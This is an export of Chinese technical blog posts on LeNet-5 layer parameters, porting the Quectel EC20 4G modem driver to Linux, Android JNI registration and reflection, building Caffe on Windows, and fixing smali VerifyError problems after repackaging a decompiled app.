
  LeNet-5简介：
    CNN里面的一篇代表性文章，主要是涵盖了现在CNN的卷积、池化、全连接等概念，同时其层数很浅，方便我学习。（这里主要基于LeNet5论文讲解，现在的caffe和tf上带的LeNet-5工程是和原文不同的，具体在后序两篇文章分析。）


LeNet-5网络简介

    
        
    
    
&emsp;&emsp;此截图来至于，LeNet-5论文原文。
  主要由以下构成：
    INPUT输入、C1卷积层、S2池化层（(求和取平均)*w+b）、C3卷积层（此层是按照一定的规则卷积，所以不易理解，和C1,C5基本卷积操作不同）、S4池化层（S2类似）、C5卷积层、F6全连接映射的是一个字符表、OUTPUT打分输出（RBF）
  结构分析：
Input层
size:32 * 32
C1层
卷积核(CC):5 * 5 
stride：1
pad：0
featuremapcount：6
featuremapsize：28 * 28
（计算方法：32-5+1= 28）
(计算公式：O=（I+2 * pad-CC）/ stride+1)
参数个数：6  * （5 * 5+1）=156
连接个数：（5 * 5+1） * 28 * 28 * 6
（featuremap每个像素和5*5个w和一个b有一个连接。w是权重，b是偏置）
S2层
核:2*2
stride：2
featuremapcount：6
featuremapsize：14 * 14
（计算方法：28/2,对核进行求和，然后乘以w，加上一个偏置）
参数个数：(1+1) * 6=12
连接数：(4 * 1+1) * 14 * 14 * 6=5880
(不同的人有不同的理解，反正就是featuremap每个像素和上层的连线，这里是:4个像素求和平均乘以w加上一个b)
C3层
卷积核(CC):5 * 5 
stride：1
pad：0
featuremapcount：16
（计算方法：下图每列对应一个featuremap，分为四组，0-5（分别和上层3个featuremap计算），6-11（同理），12-14（同理），15（同理）。）

    
        
    
  
featuremapsize：10 * 10
(14-5+1=10)
参数个数：6*（3 * 5 * 5+1）+6* （4* 5* 5+1）+3*（4 *5* 5+1）+1* (6* 5* 5+1)=1516(分组计算)
连接个数：1516* 10* 10=151600(同上)
S4层
核:2*2
stride：2
featuremapcount：16
featuremapsize：5 * 5
参数个数：(1+1) * 16=12（2018/9/28,感谢网友指正此处参数个数）
连接数：(4* 1+1)* 5* 5* 16=2000
C5层
卷积核(CC):5* 5 
stride：1
pad：0
featuremapcount：120
featuremapsize：1* 1
参数个数：(5* 5* 16+1)* 120=48120
(此处由于每个像素都和前一层16个featuremap相连)
连接数：48120* 1* 1=48120
F6层
featuremapcount：84
(为了输出选的特定的数)
featuremapsize：1* 1
参数个数：84* （120* 1+1）=10164
（上层为1* 1，全连接，输出为84* 1* 1）
连接数：84*（120 * 1+1）* 1 * 1=10164
Output层
参数个数：84* 10=840
连接数：84* 10=840=840
说明：我只知道这个打分函数叫做RBF，具体就是计算输入和参数的向量距离，距离越近，就越有可能是当前数字。对于此函数的更深原理，我看了个大概，有兴趣的可以去研究。




后记

  只要具备CNN基本理论知识（卷积核、步长、pad、池化、卷积、全连接）都可以慢慢的理解这个东西。由于我是新手，我知道新手对哪些很疑惑，所以对每一个值的计算我都有详细的写出，包括原理和出处。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>计算机视觉</tag>
        <tag>CNN</tag>
        <tag>LeNet-5</tag>
        <tag>deep-learning</tag>
      </tags>
  </entry>
  <entry>
    <title>移远EC20 4G模块Linux驱动移植和测试</title>
    <url>/2017/11/21/blog_idx_046/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  无




EC20 驱动移植与测试



EC20简介
  EC20是一个全网通的4G模块，并提供了详细的驱动移植资料（源码+文档），我也仅仅是照着文档，一点点的改，并建立起来一个可用的环境。


EC20驱动移植准备


首先你会从厂家拿到一个资料文件，并解压（类似Quectel_GobiNetSR01A02V16.zip）


你会找到一个用户手册的PDF打开（类似Quectel_WCDMA&amp;LTE_Linux_USB_Driver_User_Guide_V1.6.pdf）


这里还有一个Readme.txt告诉你需要阅读上文pdf的哪些内容。可能如下：


About GobiNet driver, please refer to the chapter 3.2、3.4、5.4、6
About ConnectManager，please refer to the chapter 5.4


按照pdf指示如下。




EC20 Linux驱动移植


增加PID&amp;VID（对着两个不了解的，建议去找找资料来看看，这个的意思可以简单理解为这个设备的唯一标识）
[KERNEL]/drivers/usb/serial/option.c


static const struct usb_device_id option_ids[] = &#123;
	#if 1 //Added by Sky  
	&#123; USB_DEVICE(0x05C6, 0x9090) &#125;, /* Quectel UC15 */  
	&#123; USB_DEVICE(0x05C6, 0x9003) &#125;, /* Quectel UC20 */  
	&#123; USB_DEVICE(0x05C6, 0x9215) &#125;, /* Quectel EC20 */  
	&#123; USB_DEVICE(0x2C7C, 0x0125) &#125;, /* Quectel EC25/EC20 R2.0 */  
	&#123; USB_DEVICE(0x2C7C, 0x0121) &#125;, /* Quectel EC21 */ 
	#endif 
  这里其实只需要{ USB_DEVICE(0x05C6, 0x9215) }, /* Quectel EC20 */  这一项，其他是无关紧要的，可以不放进去。option_ids[]就是一usb serial的设备pid，vid表。


注释掉冲突的vid以及pid设备（我猜存在相同的vid和pid是历史的原因）
[KERNEL]/drivers/usb/serial/qcserial.c


//Comment by Sky,
//&#123;USB_DEVICE(0x05c6, 0x9215)&#125;,	/* Acer Gobi 2000 Modem device (VP413) */
[KERNEL]/drivers/net/usb/qmi_wwan.c
//comment by Sky
//&#123;QMI_GOBI_DEVICE(0x05c6, 0x9215)&#125;,	/* Acer Gobi 2000 Modem device (VP413) */
  注意这里貌似只有EC20的冲突了。


添加零包处理（这个和usb 协议中的批量传输有关）
For Linux Kernel Version newer than 2.6.34:


File: [KERNEL]/drivers/usb/serial/usb_wwan.c
usb_fill_bulk_urb(urb, serial->dev,      usb_sndbulkpipe(serial->dev, endpoint) | dir,      buf, len, callback, ctx);
#if 1 //Added by Sky for Zero Packet
if (dir == USB_DIR_OUT)
&#123;
	struct usb_device_descriptor *desc = &amp;serial->dev->descriptor;
	if (desc->idVendor == cpu_to_le16(0x05C6) &amp;&amp; desc->idProduct == cpu_to_le16(0x9090))
		urb->transfer_flags |= URB_ZERO_PACKET;
	if (desc->idVendor == cpu_to_le16(0x05C6) &amp;&amp; desc->idProduct == cpu_to_le16(0x9003))
		urb->transfer_flags |= URB_ZERO_PACKET;
	if (desc->idVendor == cpu_to_le16(0x05C6) &amp;&amp; desc->idProduct == cpu_to_le16(0x9215))
		urb->transfer_flags |= URB_ZERO_PACKET;
	if (desc->idVendor == cpu_to_le16(0x2C7C))
		urb->transfer_flags |= URB_ZERO_PACKET;
&#125;
#endif 
  注意，pdf上还有For Linux Kernel Version older than 2.6.35的内容，请自行根据内核版本查看。


增加休眠后唤醒接口


For Linux Kernel Version newer than 3.4:
File: [KERNEL]/drivers/usb/serial/option.c
static struct usb_serial_driver option_1port_device = &#123;
	.driver = &#123;
		.owner =	THIS_MODULE,
		.name =		"option1",
	&#125;,
	.description       = "GSM modem (1-port)",
	.id_table          = option_ids,
	.num_ports         = 1,
	.probe             = option_probe,
	.open              = usb_wwan_open,
	.close             = usb_wwan_close,
	.dtr_rts	   = usb_wwan_dtr_rts,
	.write             = usb_wwan_write,
	.write_room        = usb_wwan_write_room,
	.chars_in_buffer   = usb_wwan_chars_in_buffer,
	.set_termios       = usb_wwan_set_termios,
	.tiocmget          = usb_wwan_tiocmget,
	.tiocmset          = usb_wwan_tiocmset,
	.ioctl             = usb_wwan_ioctl,
	.attach            = option_attach,
	.release           = option_release,
	.port_probe        = usb_wwan_port_probe,
	.port_remove	   = usb_wwan_port_remove,
	.read_int_callback = option_instat_callback,
#ifdef CONFIG_PM
	.suspend           = usb_wwan_suspend,
	.resume            = usb_wwan_resume,
	#if 1  //Added by Sky  
	.reset_resume   = usb_wwan_resume, 
	#endif 
#endif
&#125;;


如果要使用 GobiNet or QMI WWAN，需要阻止第四个接口注册为串口。
For Linux Kernel Version newer than 2.6.30:


File: [KERNEL]/drivers/usb/serial/option.c
static int option_probe(struct usb_serial *serial,
			const struct usb_device_id *id)
&#123;
	struct usb_interface_descriptor *iface_desc =
				&amp;serial->interface->cur_altsetting->desc;
	struct usb_device_descriptor *dev_desc = &amp;serial->dev->descriptor;

	/* Never bind to the CD-Rom emulation interface	*/
	if (iface_desc->bInterfaceClass == 0x08)
		return -ENODEV;

	/*
	 * Don't bind reserved interfaces (like network ones) which often have
	 * the same class/subclass/protocol as the serial interfaces.  Look at
	 * the Windows driver .INF files for reserved interface numbers.
	 */
	if (is_blacklisted(
		iface_desc->bInterfaceNumber,
		OPTION_BLACKLIST_RESERVED_IF,
		(const struct option_blacklist_info *) id->driver_info))
		return -ENODEV;
	/*
	 * Don't bind network interface on Samsung GT-B3730, it is handled by
	 * a separate module.
	 */
	if (dev_desc->idVendor == cpu_to_le16(SAMSUNG_VENDOR_ID) &amp;&amp;
	    dev_desc->idProduct == cpu_to_le16(SAMSUNG_PRODUCT_GT_B3730) &amp;&amp;
	    iface_desc->bInterfaceClass != USB_CLASS_CDC_DATA)
		return -ENODEV;


		#if 1  //Added by Sky 
		//Quectel UC20's interface 4 can be used as USB Network device  
		if (serial->dev->descriptor.idVendor == cpu_to_le16(0x05C6) &amp;&amp; serial->dev->descriptor.idProduct == cpu_to_le16(0x9003)  \
			 &amp;&amp; serial->interface->cur_altsetting->desc.bInterfaceNumber >= 4)   
		return -ENODEV; 
		//Quectel EC20's interface 4 can be used as USB Network device  
		if (serial->dev->descriptor.idVendor == cpu_to_le16(0x05C6) &amp;&amp; serial->dev->descriptor.idProduct == cpu_to_le16(0x9215)  \
			&amp;&amp; serial->interface->cur_altsetting->desc.bInterfaceNumber >= 4)   
			return -ENODEV; 
			//Quectel EC21&amp;EC25&amp;EC20 R2.0's interface 4 can be used as USB Network device  
		if (serial->dev->descriptor.idVendor == cpu_to_le16(0x2C7C)   \
			&amp;&amp; serial->interface->cur_altsetting->desc.bInterfaceNumber >= 4)   
			return -ENODEV; 
		#endif 


	/* Store device id so we can use it during attach. */
	usb_set_serial_data(serial, (void *)id);

	return 0;
&#125;


修改内核配置，并编译内核，刷入新内核
  添加USB 串口 GSM 和 CDMA 驱动选项



    
        
    
   
  启用USB网络支持

    
        
    
    
  添加驱动代码
//Step 5: Please add the following statements to file "[KERNEL]/drivers/net/usb/Makefile" ([KERNEL]/drivers/usb/net/Makefile if the kernel version is older than 2.6.22). 
obj-y += GobiNet.o 
GobiNet-objs := GobiUSBNet.o QMIDevice.o QMI.o 


quectel-CM 测试


//交叉编译quectel-CM 
/*quectel-CM will  call busybox udhpc to obtain IP and NDS, and busybox udhpc will call script file /usr/share/udhcpc/default.script to set IP/DNS/Routing table for Linux board. You can download this tool’s source code from https://busybox.net/. You should enable CONFIG_UDHCPC in busybox menuconfig，and copy the script file [BUSYBOX]/examples/udhcp/simple.script to your Linux board (renamed as /usr/share/udhcpc/default.script). */
quectel-CM –s ctnet &amp; 
[01-01_00:26:45:355] Quectel_ConnectManager_SR01A01V10 
[01-01_00:26:45:356] ./quectel-CM profile = ctnet///, pincode =  
[01-01_00:26:45:357] Find qmichannel = /dev/qcqmi2 
[01-01_00:26:45:358] Find usbnet_adapter = eth2 
[01-01_00:26:45:368] Get clientWDS = 7 
[01-01_00:26:45:400] Get clientDMS = 8 
[01-01_00:26:45:432] Get clientNAS = 9 
[01-01_00:26:45:464] Get clientWDA = 10 
[01-01_00:26:45:496] requestBaseBandVersion EC20CQAR02A03E2G_BETA0914  1  [Sep 14 2015 13:51:27] 
[01-01_00:26:45:560] requestGetSIMStatus SIMStatus: SIM_READY 
[01-01_00:26:45:624] requestGetProfile ctnet///0 
[01-01_00:26:45:656] requestRegistrationState MCC: 460, MNC: 11, PS: Attached, DataCap: LTE 
[01-01_00:26:45:688] requestQueryDataCall ConnectionStatus: DISCONNECTED 
[01-01_00:26:45:720] requestRegistrationState MCC: 460, MNC: 11, PS: Attached, DataCap: LTE 
[01-01_00:26:45:752] requestQueryDataCall ConnectionStatus: DISCONNECTED 
[01-01_00:26:45:816] requestSetupDataCall WdsConnectionIPv4Handle: 0x43cc4478 
[01-01_00:26:45:912] requestQueryDataCall ConnectionStatus: CONNECTED 
[01-01_00:26:45:937] udhcpc (v1.20.2) started 
[01-01_00:26:45:956] Sending discover... 
[01-01_00:26:45:960] Sending select for 10.172.27.151... 
[01-01_00:26:45:964] Lease of 10.172.27.151 obtained, lease time 7200 
[01-01_00:26:45:984] deleting routers 
route: SIOCDELRT: No such process 
[01-01_00:26:46:003] adding dns 61.132.163.68 
[01-01_00:26:46:003] adding dns 202.102.213.68 
  注意，这里需要UDHCPC ，检测你的busybox是否有这个东西，如果不存在，你需要重新移植busybox，启用CONFIG_UDHCPC选项。还需要配置一个配置文件，注意检查。
  特别提示，其中很多关于内核源码修改，以及内核配置修改，不同的版本有不同的写法，文档里面都有详细说明，请使用时，特别注意。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux驱动</tag>
        <tag>移远EC20</tag>
        <tag>LTE</tag>
        <tag>4G</tag>
      </tags>
  </entry>
  <entry>
    <title>Android JNI静态和动态注册 、Java Reflect（C或C++层反射和JAVA层反射）、Java 可变参数（JNI实现）</title>
    <url>/2018/01/09/blog_idx_052/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  由于最近重新接触了部分Android相关的东西，对一些需要混合编程的手段做了整理，同时也对Java中常见的反射技术进行归纳总结。（本文适合知道JNI和反射是什么鬼的人阅读）(可变参数实现在JNI部分的IoctlGpio方法)




Java JNI

  Java native interface（java本地调用接口）主要是实现C或者C++和java交互。先来看一张来至于网上的图（如果侵权，请联系我，我会第一时间删除）

    
        
    
   
  此图说明了一个jvm中（一个进程中）所拥有的资源。而JNI就是用来实现调用本地方法的一种方法。而这些本地方法有两种方式可以被注册到jvm中，分别如下:


JNI之静态注册
public class Operate_Gpio &#123;
    public native int IoctlGpio(int cmd, String ...arg);
    public native int IoctlGpio(int cmd, int ...arg);
    
	//java static code
	static &#123;
        System.loadLibrary("OperateGpio");
    &#125;
  &#125;
    //call IoctlGpio()
  Operate_Gpio op_gpio = new Operate_Gpio();
  op_gpio.IoctlGpio(2,1,3);
  op_gpio.IoctlGpio(2,"a","b");
extern "C"
JNIEXPORT jint JNICALL
Java_JNI_Operate_1Gpio_IoctlGpio(JNIEnv *env, jobject instance, jint cmd,jobjectArray arg) &#123;

    jboolean iscopy;

    switch (cmd) &#123;
        case 1: &#123;
            jint *arg1 = env->GetIntArrayElements((jintArray) arg, 0);

            NativeLog(env, instance, 'D', "Test string arg1",
                      Int_to_String(arg1[0]));
            NativeLog(env, instance, 'D', "Test string arg2",
                      Int_to_String(arg1[1]));
                      env->ReleaseIntArrayElements((jintArray)arg, arg1, 0);
            break;
        &#125;
        case 2: &#123;
            jstring arg3 = (jstring) env->GetObjectArrayElement(arg, 0);
            jstring arg4 = (jstring) env->GetObjectArrayElement(arg, 1);
            NativeLog(env, instance, 'D', "Test string arg3",
                      env->GetStringUTFChars(arg3, &amp;iscopy));
            NativeLog(env, instance, 'D', "Test string arg4",
                      env->GetStringUTFChars(arg4, &amp;iscopy));
            break;
        &#125;
        default:&#123;
            break;
        &#125;

    &#125;
    return 0;

&#125;
  说明：通过特定的函数命名方式（包名__类名__函数名）（若以上命名中含有_，将会通过在其后加一位数字方式来标识）来注册。当在java层调用System.loadLibrary，jvm会遍历这个so库的所有合法的方法，并放到本地方法栈，以供使用。
  缺点：


初次call本地函数时，需要先在jni下去搜索相关的jni函数，然后建立jni函数和native函数关系，导致效率降低


使用规则复杂，不利于开发（不方便）。




JNI之动态注册
public class Operate_Gpio &#123;
public native  int TestGpio();
	//java static code
	static &#123;
        System.loadLibrary("OperateGpio");
    &#125;
&#125;

  Operate_Gpio op_gpio = new Operate_Gpio();
  op_gpio.TestGpio();
/**
* Table of methods associated with a single class.
*/
/*
 *
 * typedef struct &#123;
    const char* name;
    const char* signature;
    void*       fnPtr;
&#125; JNINativeMethod;
 * */
// 结构体，分别是java层的函数名称，签名，对应的函数指针
static JNINativeMethod gMethods[] = &#123;
        &#123; "TestGpio", "()I", (void*)TestGpio &#125;,//绑定
&#125;;
static int registerNativeMethods(JNIEnv* env, const char* className,
                                 JNINativeMethod* gMethods, int numMethods)
&#123;
    jclass clazz;
    clazz = env->FindClass(className);
    if (clazz == NULL) &#123;
        return JNI_FALSE;
    &#125;
    if (env->RegisterNatives(clazz, gMethods, numMethods) &lt; 0) &#123;
        return JNI_FALSE;
    &#125;

    return JNI_TRUE;
&#125;

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved)
&#123;
    JNIEnv* env = NULL;

    if ( vm->GetEnv((void**) &amp;env, JNI_VERSION_1_4) != JNI_OK) &#123;
        return -1;
    &#125;
    assert(env != NULL);

    if (!registerNativeMethods(env, JNIREG_CLASS, gMethods,
                               sizeof(gMethods) / sizeof(gMethods[0])))
        return -1;
    /* success -- return valid version number */
    return JNI_VERSION_1_4;
&#125;
  说明：


JNINativeMethod保存Java Native函数和JNI函数的对应关系


Java层中调用System.loadLibrary加载so库，并调用JNI_OnLoad开始注册


JNI_OnLoad中调用AndroidRuntime::registerNativeMethods


AndroidRuntime::registerNativeMethods中调用        jniRegisterNativeMethods


  注意：这里有个知识叫做java签名，此签名是指的方法的类型标识，也就是一堆类型简写。（写法：(函数参数列表)返回值）
  下列是常用的类型总结（资料来于网上，若有侵权，请联系我，我第一时间删除）：
&#x2F;*

Java方法签名中特殊字符&#x2F;字母含义
特殊字符	数据类型	特殊说明
V	void 	一般用于表示方法的返回值
Z	boolean	 
B	byte	 
C	char	 
S	short	 
I	int	 
J	long	 
F	float	 
D	double	 
[	数组	以[开头，配合其他的特殊字符，表示对应数据类型的数组，几个[表示几维数组
L全类名;	引用类型	以L开头、;结尾，中间是引用类型的全类名

*&#x2F;




Java Reflect

  程序运行时获取类的属性，也可调用类的方法。可灵活的方便构建出各种复杂的逻辑结构。


C或者C++层反射

int static NativeLog(JNIEnv *env, jobject instance ,char type, std::string tag, std::string msg)&#123;

    jclass clazz &#x3D; env-&gt;FindClass(&quot;android&#x2F;util&#x2F;Log&quot;) ;
    jmethodID jmth_id;
    switch (type)&#123;

        case &#39;V&#39;:
            jmth_id  &#x3D; env-&gt;GetStaticMethodID(clazz, &quot;v&quot;, &quot;(Ljava&#x2F;lang&#x2F;String;Ljava&#x2F;lang&#x2F;String;)I&quot;);
            break;
        case &#39;D&#39;:
            jmth_id  &#x3D; env-&gt;GetStaticMethodID(clazz, &quot;d&quot;, &quot;(Ljava&#x2F;lang&#x2F;String;Ljava&#x2F;lang&#x2F;String;)I&quot;);
            break;
        case &#39;I&#39;:
            jmth_id  &#x3D; env-&gt;GetStaticMethodID(clazz, &quot;i&quot;, &quot;(Ljava&#x2F;lang&#x2F;String;Ljava&#x2F;lang&#x2F;String;)I&quot;);
            break;
        case &#39;W&#39;:
            jmth_id  &#x3D; env-&gt;GetStaticMethodID(clazz, &quot;w&quot;, &quot;(Ljava&#x2F;lang&#x2F;String;Ljava&#x2F;lang&#x2F;String;)I&quot;);
            break;
        case &#39;E&#39;:
            jmth_id  &#x3D; env-&gt;GetStaticMethodID(clazz, &quot;e&quot;, &quot;(Ljava&#x2F;lang&#x2F;String;Ljava&#x2F;lang&#x2F;String;)I&quot;);
            break;
        default:
            break;
    &#125;

    return env-&gt;CallStaticIntMethod(clazz, jmth_id, env-&gt;NewStringUTF(tag.c_str()), env-&gt;NewStringUTF(msg.c_str()));
&#125;

extern &quot;C&quot;
JNIEXPORT jint JNICALL
Java_JNI_Operate_1Gpio_OpenGpio(JNIEnv * env, jobject obj)&#123;
    &#x2F;&#x2F;open devices ... ...
    NativeLog(env, obj, &#39;D&#39;, &quot;Test&quot;, &quot;Reflect test.&quot;);
    return 0;
&#125;
public class Operate_Gpio &#123;

    public native int OpenGpio();

    // Used to load the 'native-lib' library on application startup.
    static &#123;
        System.loadLibrary("OperateGpio");
    &#125;
&#125;

Operate_Gpio op_gpio = new Operate_Gpio();
op_gpio.OpenGpio();


JAVA层反射
try &#123;
    Class clazz = Class.forName("android.util.Log");
    Method method = clazz.getDeclaredMethod("d", String.class, String.class);
    method.invoke(null,"Test","Fuck");//调用静态函数
&#125; catch (ClassNotFoundException e) &#123;
    e.printStackTrace();
&#125; catch (NoSuchMethodException e) &#123;
    e.printStackTrace();
&#125; catch (IllegalAccessException e) &#123;
    e.printStackTrace();
&#125; catch (InvocationTargetException e) &#123;
    e.printStackTrace();
&#125;
  所有结果的最终效果如图：

    
        
    
  




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>JAVA</category>
        <category>安全</category>
      </categories>
      <tags>
        <tag>嵌入式</tag>
        <tag>JAVA</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Caffe源码编译,win10+vs2015+Ninja,C++接口测试(mnist),Python接口测试(mnist),(坑爹篇)</title>
    <url>/2017/12/19/blog_idx_048/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  date 2017.12.18
前言

  首先为了帮队友在win下配置caffe，本人特意在win平台下折腾了一波。在此只想说一句话：个人认为，caffe编译Win比Linux更坑，更难，花了我接近一天的时间（我以前在Linux上配置过N次了）。




caffe windows 编译

  注意事项（这才是精华，我就是因为这个才浪费了这一天时间）
    1. 是否安装readme提供的符合要求的vs，cmake，ninja版本？
    2. 是否安装了正确的python版本?
    3. 对于VS来说，检查，你的电脑上应该只存在一个版本，而且此版本应该包含VC++的功能（包括MFC以及基础功能）（不理解就全部装上，绝对不吃亏，不上当，我就是因为节约空间，少装了一些东西，出问题了）
    4. 检查python是否只有一个版本，建议安装anaconda？
    5. 检查自己的环境变量，对于cl.exe,python.exe,cmake.exe,ninja.exe是否找到？
    6. 最后，不想折腾就尽量按照帮助文档，一个钉子一个眼的做法，这样会少很多错误？


下载caffe,切换分支,运行脚本,一切顺利，你就是幸运的那个人。执行以下命令以前，保证注意事项都看了，想要加速的，自己确定自己的cuda和cudnn配置好了。


git clone https://github.com/BVLC/caffe.git
cd caffe
git checkout windows
./scripts/build_win.cmd
（喝口水）


WindowsDownloadPrebuiltDependencies.cmake 此脚本报错，报找不到服务器


原因：主要是天朝牌防火墙
方法：
1 开vpn或者其他工具翻墙。
2 自己想办法去下对应的文件（自己分析以下这段文字），放到.caffe/download目录（一般在用户目录下）
我的下载地址：https://github.com/willyd/caffe-builder/releases/download/v1.1.0/libraries_v140_x64_py35_1.1.0.tar.bz2(对应vs2015,python3.5)
set(DEPENDENCIES_VERSION 1.1.0)
set(DEPENDENCIES_NAME_1800_27 libraries_v120_x64_py27_$&#123;DEPENDENCIES_VERSION&#125;)
set(DEPENDENCIES_NAME_1900_27 libraries_v140_x64_py27_$&#123;DEPENDENCIES_VERSION&#125;)
set(DEPENDENCIES_NAME_1900_35 libraries_v140_x64_py35_$&#123;DEPENDENCIES_VERSION&#125;)

set(DEPENDENCIES_URL_BASE https:&#x2F;&#x2F;github.com&#x2F;willyd&#x2F;caffe-builder&#x2F;releases&#x2F;download)
set(DEPENDENCIES_FILE_EXT .tar.bz2)
set(DEPENDENCIES_URL_1800_27 &quot;$&#123;DEPENDENCIES_URL_BASE&#125;&#x2F;v$&#123;DEPENDENCIES_VERSION&#125;&#x2F;$&#123;DEPENDENCIES_NAME_1800_27&#125;$&#123;DEPENDENCIES_FILE_EXT&#125;&quot;)
set(DEPENDENCIES_SHA_1800_27 &quot;ba833d86d19b162a04d68b09b06df5e0dad947d4&quot;)
set(DEPENDENCIES_URL_1900_27 &quot;$&#123;DEPENDENCIES_URL_BASE&#125;&#x2F;v$&#123;DEPENDENCIES_VERSION&#125;&#x2F;$&#123;DEPENDENCIES_NAME_1900_27&#125;$&#123;DEPENDENCIES_FILE_EXT&#125;&quot;)
set(DEPENDENCIES_SHA_1900_27 &quot;17eecb095bd3b0774a87a38624a77ce35e497cd2&quot;)
set(DEPENDENCIES_URL_1900_35 &quot;$&#123;DEPENDENCIES_URL_BASE&#125;&#x2F;v$&#123;DEPENDENCIES_VERSION&#125;&#x2F;$&#123;DEPENDENCIES_NAME_1900_35&#125;$&#123;DEPENDENCIES_FILE_EXT&#125;&quot;)
set(DEPENDENCIES_SHA_1900_35 &quot;f060403fd1a7448d866d27c0e5b7dced39c0a607&quot;)


.\caffe/export.hpp(7): fatal error C1083: 无法打开包括文件: “caffe/include_symbols.hpp”: No such file or directory


此文件在caffe/build 目录，自己拷贝到caffe/include/caffe/下，就好了。
这个bug主要是由于没有把build目录传递给cl.exe,导致找不到文件。
（参考此问题https://github.com/BVLC/caffe/issues/5840，我也提交了可能的解决方法，希望帮助你们）



caffe mnist数据集的train 和test


首先请下载mnist数据集，这里我打包上传了四个文件，下载地址。http://download.csdn.net/download/u011728480/10163922（下载地址参考caffe/data/mnist/get_mnist.sh文件，在原生的win下，wget是找不到的，所以，自己去下载吧）
如图

    
        
    
   
# 做以下操作时，保证caffe已经正常编译通过。
# 首先把数据集转为lmdb格式存放，这是caffe支持的存储格式。
# 转换：
./convert_mnist_data.exe ../../../data/mnist/train-images-idx3-ubyte ../../../data/mnist/train-labels-idx1-ubyte ./mnist_train_lmdb --backend=lmdb

./convert_mnist_data.exe ../../../data/mnist/t10k-images-idx3-ubyte ../../../data/mnist/t10k-labels-idx1-ubyte ./mnist_test_lmdb --backend=lmdb
# 生成如图A两个文件夹

# train:
./build/tools/caffe.exe train --solver=examples/mnist/lenet_solver.prototxt
# 生成如图B四个文件
# 结果如图C，迭代10000,准确率99.03%.
# test:
./build/tools/caffe.exe test -model=examples/mnist/lenet_train_test.prototxt -weights=examples/mnist/lenet_iter_10000.caffemodel -gpu=0

# 测试结果如图D,测试集,准确率98.56%

图A

    
        
    
   
图B

    
        
    
 
图C

    
        
    
 
图D

    
        
    
 


Caffe Python 接口测试


(我用的anaconda环境,开vpn执行，
conda config --add channels conda-forge
conda config --add channels willyd
conda install --yes cmake ninja numpy scipy protobuf==3.1.0 six scikit-image pyyaml pydotplus graphviz)
把caffe/python/caffe目录放到python的site-packages目录。
把caffe/python目录添加到PYTHONPATH环境变量
  准备一个py文件吧，迭代10000次。
import caffe
caffe.set_device(0)
caffe.set_mode_gpu()
solver = caffe.SGDSolver('examples/mnist/lenet_solver.prototxt')

iter = solver.iter
while iter&lt;10000:
    solver.step(1)
    iter = solver.iter
    input_data = solver.net.blobs['data'].data  
    loss = solver.net.blobs['loss'].data
    accuracy = solver.test_nets[0].blobs['accuracy'].data
    print('iter:', iter, 'loss:', loss,'accuracy:',accuracy)

    
        
    
 
  注意：这里很有可能要报一个错误，PIL模块中的Image模块加载失败，提示核心提示：from PIL import Image ， DLL 加载失败。我把PIL模块降级到4.2左右就可以了，具体看你python版本，不要用最新的，不知道降到哪个版本就自己一个一个的降级。




后记

  说真的，没有特别需求，别在windows下用源码折腾caffe，太坑。不喜欢折腾的人可以去下载已经编译好的二进制文件。最后说一句，在Linux下用caffe真的很简单的，点F*ck。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>Caffe源码安装</tag>
      </tags>
  </entry>
  <entry>
    <title>反编译和逆向出现:java.lang.VerifyError(新问题样本)</title>
    <url>/2017/12/22/blog_idx_049/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  某日，遇到一个App，突然想来一发，于是，直接下到这个app的老一点的版本，用某自动脱壳机脱壳后，得到Dex文件。并通过工具（AndroidKiller）生成Smali文件（此文件不完整）




java.lang.VerifyError

  首先，把Smali文件放回到我们反编译后的Apk文件目录去，修复相关的类目录。这时候，在通过工具，把整个工程重新编译生成Apk，是可以正常安装的，但是不能够正常打开，并且得到java.lang.VerifyError错误。
  经过大量的搜索和整理，得到如下结论。
    此错的原因为：由于smali指令序列不符合相关的规范（指令丢失，反编译失败了，或者指令反编译错误，得到了错误的smali指令。对于反编译失败，相关的反编译工具（AndroidKiller）可能会在当前字段出现标注，根据标注解决就好）。
  网上现存的不规范的原因：


寄存器使用数量和定义个数不一致（用脚本很容易出现此问题）


函数体不完整，丢失相关标识符.end method等


java.lang.VerifyError 新问题样本


反编译出问题的东西大部分在构造函数，init()方法大部分都出现在缺少return-void


当前类继承的interface，父类为java object ，出现 没有调用java object - &gt; init()方法


  对于以上问题，其实相关工具会在smali文件里面存在 #disallowed odex opcode错误，直接搜索就可以解决。




后记

  无
参考文献


无







    
        
